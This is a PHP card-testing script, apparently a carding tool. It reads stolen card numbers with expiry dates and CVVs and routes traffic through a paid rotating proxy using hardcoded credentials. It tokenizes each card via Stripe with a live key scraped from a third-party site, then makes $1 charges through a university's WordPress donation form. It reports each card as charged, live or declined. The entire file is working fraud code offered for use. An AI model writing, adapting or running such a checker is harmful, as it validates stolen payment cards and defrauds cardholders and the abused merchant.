<?php 
////////////////////////////===RAW BY HARIS===////////////////////////////
require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

/* Existing proxy.txt functionality disabled
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();
*/

$auth = "gloosmoke11-rotate:gloosmoke";
$ip = "p.webshare.io:80";
$proxy = $ip;
$proxyauth = $auth;
$url = 'http://api.ipify.org/';

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

// Execute the cURL request and get the response
$response = curl_exec($ch);

// Check for cURL errors
if(curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
} else {
    // Print the IP address
    echo 'IP Address: ' . $response;
}

// Close the cURL session
curl_close($ch);

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end) {
    $start = @strpos($str,$find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));

}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[1 Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&key=pk_live_51GSlEwFYWyXSCMPI20lU7U0S0GrYvvmkOSX6i53vXivz6d5uhEI7oLCrD46hIFH8eb4GN3BUbG4JPw8YYoVdwTkS00ljIlfNnc');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
curl_close($ch);
sleep(10);

////////////////////////////===[2 Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://osiriuniversity.org/wp-admin/admin-ajax.php?t=1717189125159');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1717189125159 h2',
'Host: osiriuniversity.org',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://osiriuniversity.org',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://osiriuniversity.org/pay/',
'accept-language: en-US,en;q=0.9',
));

////////////////////////////===[2 Req Postfields]////////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D44349%26_fluentform_46_fluentformnonce%3D50a1655de3%26_wp_http_referer%3D%252Fpay%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26custom-payment-amount%3D1%26payment_method_1%3Dstripe%26input_text%3D%26__entry_intermediate_hash%3D0dc5cbb25e7222b1bba6b7b29c9ddbad%26item__46__fluent_checkme_%3D%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=46');

$result2 = curl_exec($ch);
curl_close($ch);
sleep(10);

////////////////////////////===[Responses CVV]===////////////////////////////

if
(strpos($result2,  'Thank you!')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 1$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'security code is incorrect')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'insufficient funds')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: INSUFFICENT FUNDS ✅ </i></font><br> <font class='badge badge-dark'> $bank $country Power Bysanji ⚡ </i></font><br>";
}

else {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>❌ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Result: GENERIC DECLINED ❌ </i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
//echo $result2;
////////////////////////////===RAW BY HARIS===////////////////////////////
?>
